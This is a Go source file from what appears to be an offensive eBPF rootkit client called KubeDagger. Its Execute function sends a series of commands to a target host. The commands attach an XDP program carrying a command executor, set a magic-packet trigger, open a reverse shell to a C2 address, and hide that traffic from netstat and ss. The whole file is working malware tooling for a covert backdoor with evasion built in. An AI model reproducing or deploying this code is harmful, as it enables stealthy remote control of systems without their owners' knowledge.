package xdp_shell

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type XDPShellResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, connectAddr, protocol, output string) error {
	result := &XDPShellResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_xdp_program",
			"attach XDP program with embedded command executor to network interface",
			"xdp_shell_attach",
		},
		{
			"configure_magic_packet",
			"set magic byte sequence that triggers command extraction from incoming packets",
			"xdp_shell_set_magic",
		},
		{
			"enable_response_injection",
			"configure bpf_xdp_adjust_head for raw packet response construction",
			"xdp_shell_enable_response",
		},
		{
			"connect_reverse_shell",
			"initiate reverse connection via crafted protocol packets to C2 address",
			"xdp_shell_connect",
		},
		{
			"hide_from_netstat",
			"ensure shell traffic is invisible to netstat/ss by processing at XDP layer",
			"xdp_shell_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + connectAddr + "#" + protocol
		status := shared.SendCommand(target, "/xdp_shell", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
